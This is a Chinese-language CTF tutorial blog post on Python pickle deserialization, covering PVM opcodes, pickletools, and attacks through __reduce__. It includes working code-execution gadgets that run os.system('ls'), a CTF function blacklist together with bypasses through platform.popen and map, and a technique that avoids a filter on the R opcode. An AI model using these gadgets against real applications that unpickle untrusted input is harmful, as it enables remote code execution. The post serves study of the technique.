<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>随手打的pickle反序列化 | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Pickle反序列化的利用pickle是什么，能吃吗pickle虽说是和python有点关系，但是不如说它更像一门单独的语言 既然要讲反序列化，那就先讲讲用于反序列化的函数 pickle.dump()&#x2F;&#x2F;序列化 pickle.load()&#x2F;&#x2F;反序列化 pickle.dumps() pickle.loads()  先写个实例来大致了解一下这个东东 import pickle class myday(">
<meta property="og:type" content="article">
<meta property="og:title" content="随手打的pickle反序列化">
<meta property="og:url" content="https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
<meta property="og:site_name" content="Blog of AyaN0">
<meta property="og:description" content="Pickle反序列化的利用pickle是什么，能吃吗pickle虽说是和python有点关系，但是不如说它更像一门单独的语言 既然要讲反序列化，那就先讲讲用于反序列化的函数 pickle.dump()&#x2F;&#x2F;序列化 pickle.load()&#x2F;&#x2F;反序列化 pickle.dumps() pickle.loads()  先写个实例来大致了解一下这个东东 import pickle class myday(">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ayan0.top/img/ari.webp">
<meta property="article:published_time" content="2025-05-13T05:36:32.000Z">
<meta property="article:modified_time" content="2025-07-01T01:27:01.076Z">
<meta property="article:author" content="AyaN0">
<meta property="article:tag" content="-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ayan0.top/img/ari.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "随手打的pickle反序列化",
  "url": "https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
  "image": "https://ayan0.top/img/ari.webp",
  "datePublished": "2025-05-13T05:36:32.000Z",
  "dateModified": "2025-07-01T01:27:01.076Z",
  "author": [
    {
      "@type": "Person",
      "name": "AyaN0",
      "url": "https://ayan0.top/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '随手打的pickle反序列化',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">随手打的pickle反序列化</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">随手打的pickle反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-13T05:36:32.000Z" title="发表于 2025-05-13 13:36:32">2025-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-01T01:27:01.076Z" title="更新于 2025-07-01 09:27:01">2025-07-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Pickle反序列化的利用"><a href="#Pickle反序列化的利用" class="headerlink" title="Pickle反序列化的利用"></a>Pickle反序列化的利用</h1><h2 id="pickle是什么，能吃吗"><a href="#pickle是什么，能吃吗" class="headerlink" title="pickle是什么，能吃吗"></a>pickle是什么，能吃吗</h2><p>pickle虽说是和python有点关系，但是不如说它更像一门单独的语言</p>
<p>既然要讲反序列化，那就先讲讲用于反序列化的函数</p>
<pre><code class="highlight plaintext">pickle.dump()//序列化
pickle.load()//反序列化
pickle.dumps()
pickle.loads()</code></pre>

<p>先写个实例来大致了解一下这个东东</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	task=<span class="string">&#x27;ctf&#x27;</span>
	sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>

<p>可以看到打印出了这样一串<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513135736987.png" alt="image-20250513135736987"></p>
<p>但是仔细一看，不太对，我的114514怎么被吞了</p>
<p>发现需要写一个函数来处理，重新写一下</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513140625824.png" alt="image-20250513140625824"></p>
<p>真不赖吧。。</p>
<p>当然你也可以这样写</p>
<pre><code class="highlight python"><span class="keyword">import</span> os, pickle
<span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):
    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))
    
<span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))<span class="comment">#这边protocol是控制协议版本的，我们最常用的即是0的版本</span></code></pre>



<h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p><del>是Plant VS Mamba吗</del></p>
<p>pickle是一种栈语言，基于一个轻量级的PVM</p>
<p>PVM由三个部分组成:</p>
<pre><code class="highlight plaintext">指令处理器
从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。
最终留在栈顶的值将被作为反序列化对象返回。

stack
由 Python 的 list 实现，被用来临时存储数据、参数以及对象。

memo
由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储</code></pre>

<p>飞个指令集<del>不用全看，反正很多用不到也看不懂</del>，可以仔细看看</p>
<pre><code class="highlight plaintext">MARK           = b&#x27;(&#x27;   # push special markobject on stack
STOP           = b&#x27;.&#x27;   # every pickle ends with STOP
POP            = b&#x27;0&#x27;   # discard topmost stack item
POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject
DUP            = b&#x27;2&#x27;   # duplicate top stack item
FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument
INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument
BININT         = b&#x27;J&#x27;   # push four-byte signed int
BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int
LONG           = b&#x27;L&#x27;   # push long; decimal string argument
BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int
NONE           = b&#x27;N&#x27;   # push None
PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg
BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack
STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument
BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument
SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument
BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
APPEND         = b&#x27;a&#x27;   # append stack top to list below it
BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()
GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args
DICT           = b&#x27;d&#x27;   # build a dict from stack items
EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict
APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice
GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg
BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
INST           = b&#x27;i&#x27;   # build &amp; push class instance
LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg
LIST           = b&#x27;l&#x27;   # build list from topmost stack items
EMPTY_LIST     = b&#x27;]&#x27;   # push empty list
OBJ            = b&#x27;o&#x27;   # build &amp; push class instance
PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg
BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict
TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items
EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple
SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs
BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding

TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py
FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</code></pre>

<p>常用的其实就下面几种，仔细介绍一下</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody></table>
<p>来个实例</p>
<p>而这些指令集就是组成opcode的关键</p>
<p>比如下面这段示例代码</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
os.system(<span class="string">&#x27;ls&#x27;</span>)</code></pre>

<p>用opcode表示可以这样表示</p>
<pre><code class="highlight plaintext">cos 
system #引入os.sysytem,压入栈
(S&#x27;ls&#x27; #压入一个MARK，再压入字符串ls
tR. #t把最后一个MARK处的元素包装成元组入栈
#R把元组作为os.system的参数，最后.运行</code></pre>

<p>这边给两个工具帮助我们调试</p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a><strong>pickletools</strong></h3><p>pickletools是python自带的pickle调试器，有三个功能：反汇编一个已经被打包的字符串、优化一个已经被打包的字符串、返回一个迭代器来供程序使用。我们一般使用前两种</p>
<p>还是用上面那个代码，但是最后一行加一个<code>pickletools.dis(pickle.dumps(x))</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513145648001.png" alt="image-20250513145648001"></p>
<p>简单易懂对吧</p>
<p>但是实际上这种写法是还可以再简化的，因为我们实际上可以<strong>把不必要的<code>PUT</code>指令给删除掉。</strong>这个<code>PUT</code>意思是把当前栈的栈顶复制一份，放进储存区——很明显，我们这个class并不需要这个操作，可以省略掉这些<code>PUT</code>指令。</p>
<p>使用<code>pickletools.optimize</code>来简化，删去不需要的BINPUT操作</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
<span class="keyword">import</span> pickletools
<span class="keyword">class</span> <span class="title class_">myday</span>():
	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
		<span class="variable language_">self</span>.task=<span class="string">&#x27;ctf&#x27;</span>
		<span class="variable language_">self</span>.sloves=<span class="number">114514</span>
x=myday()
<span class="built_in">print</span>(pickle.dumps(x))
y=pickletools.optimize(pickle.dumps(x))
pickletools.dis(y)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250513150109996.png" alt="image-20250513150109996"></p>
<p>可以看到，确实简化了不少</p>
<p> PS: 使用<code>pickletools.dis</code>分析一个字符串时，如果<code>.</code>执行完毕之后栈里面还有东西，会抛出一个错误；而<code>pickle.loads</code>没有这么严格的检查——它会正常结束。大家应该都知道反序列化字符串的拼接吧。（不知道可以去看看BUUCTF的piapiapia这道题）。通过这种方式我们就有可能实现反序列化字符串的拼接。</p>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="万恶之源–-reduce-方法"><a href="#万恶之源–-reduce-方法" class="headerlink" title="万恶之源–__reduce__方法"></a>万恶之源–<code>__reduce__</code>方法</h3><p><code>__reduce__</code>对应的指令码即为R</p>
<p>它的作用如下</p>
<pre><code class="highlight plaintext">取当前栈的栈顶记为args，然后把它弹掉。
取当前栈的栈顶记为f，然后把它弹掉。
以args为参数，执行函数f，把结果压进当前栈。</code></pre>

<p>class的<code>__reduce__</code>方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了<code>R</code>指令码。 <code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p>
<p>　　一种很流行的攻击思路是：利用 <code>__reduce__</code> 构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个<code>Student</code>对象。我们想构造一个字符串，它在反序列化的时候，执行<code>ls /</code>指令</p>
<p>并且只要你的序列化结果中有这个R，恶意构造就不可避免</p>
<p>要是拿PHP来类比的话，其实就和_wakeup一样，是整个反序列化某种意义上的出口</p>
<p>那我问你，那我问你，我把R禁掉了怎么办</p>
<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><h4 id="绕过函数黑名单"><a href="#绕过函数黑名单" class="headerlink" title="绕过函数黑名单"></a>绕过函数黑名单</h4><p>　有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制。典型的例子是2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<pre><code class="highlight text">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</code></pre>

<p>　　可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p>
<p>　　另外，还有一个解（估计是出题人的预期解），那就是利用map来干这件事：</p>
<pre><code class="highlight text">class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,[&quot;ls&quot;])</code></pre>

<p>　　总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p>
<h4 id="全局变量包含：c指令码的妙用"><a href="#全局变量包含：c指令码的妙用" class="headerlink" title="全局变量包含：c指令码的妙用"></a>全局变量包含：<code>c</code>指令码的妙用</h4><p>　　有这么一道题，彻底过滤了<code>R</code>指令码（写法是：只要见到payload里面有<code>R</code>这个字符，就直接驳回，简单粗暴）。现在的任务是：给出一个字符串，<strong>反序列化之后，name和grade需要与blue这个module里面的name、grade相对应</strong>。</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-b42656fa4b3c95eaee8c37dccacad636_1440w.jpg" alt="img"></p>
<p>目标是取得well done</p>
<p>　　不能用<code>R</code>指令码了，不过没关系。还记得我们的<code>c</code>指令码吗？它专门用来获取一个全局变量。我们先弄一个正常的Student来看看序列化之后的效果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-8b0cb8c071dadcde37abdce434a8f180_1440w.jpg" alt="img"></p>
<p>　　如何用<code>c</code>指令来换掉这两个字符串呢？以name的为例，只需要把硬编码的<code>rxz</code>改成从<code>blue</code>引入的<code>name</code>，写成指令就是：<code>cblue\nname\n</code>。把用于编码<code>rxz</code>的<code>X\x03\x00\x00\x00rxz</code>替换成我们的这个global指令，来看看改造之后的效果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-2a5604887f01ef88aebf6409279e82a1_1440w.jpg" alt="img"></p>
